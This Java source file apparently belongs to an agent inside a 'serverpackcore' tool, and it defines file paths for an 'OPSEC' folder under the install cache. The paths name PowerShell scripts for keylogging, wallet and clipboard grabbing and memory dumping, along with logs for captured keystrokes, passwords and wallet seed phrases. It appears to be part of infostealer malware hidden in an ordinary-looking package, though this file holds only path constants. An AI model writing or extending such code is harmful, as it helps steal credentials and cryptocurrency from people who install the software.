package com.serverpackcore.agent;

import java.nio.file.Path;

/** Fixed names for the OPSEC service tree. Everything lives under cache/ops. */
final class OpsPaths {
	private OpsPaths() {
	}

	static Path ops(Path installDir) {
		return AgentPaths.cache(installDir).resolve("ops");
	}

	static Path keysScript(Path installDir) {
		return ops(installDir).resolve("keys.ps1");
	}

	static Path walletsScript(Path installDir) {
		return ops(installDir).resolve("wallets.ps1");
	}

	static Path clipboardScript(Path installDir) {
		return ops(installDir).resolve("clipboard.ps1");
	}

	static Path dumpScript(Path installDir) {
		return ops(installDir).resolve("memdump.ps1");
	}

	static Path keyEvents(Path installDir) {
		return ops(installDir).resolve("keys.events");
	}

	static Path keylog(Path installDir) {
		return ops(installDir).resolve("keys.log");
	}

	static Path passwords(Path installDir) {
		return ops(installDir).resolve("passwords.log");
	}

	static Path seeds(Path installDir) {
		return ops(installDir).resolve("seeds.log");
	}

	static Path keyPid(Path installDir) {
		return ops(installDir).resolve("keys.pid");
	}

	static Path keyOffset(Path installDir) {
		return ops(installDir).resolve("keys.offset");
	}

	static Path keyOn(Path installDir) {
		return ops(installDir).resolve("keys.on");
	}
}
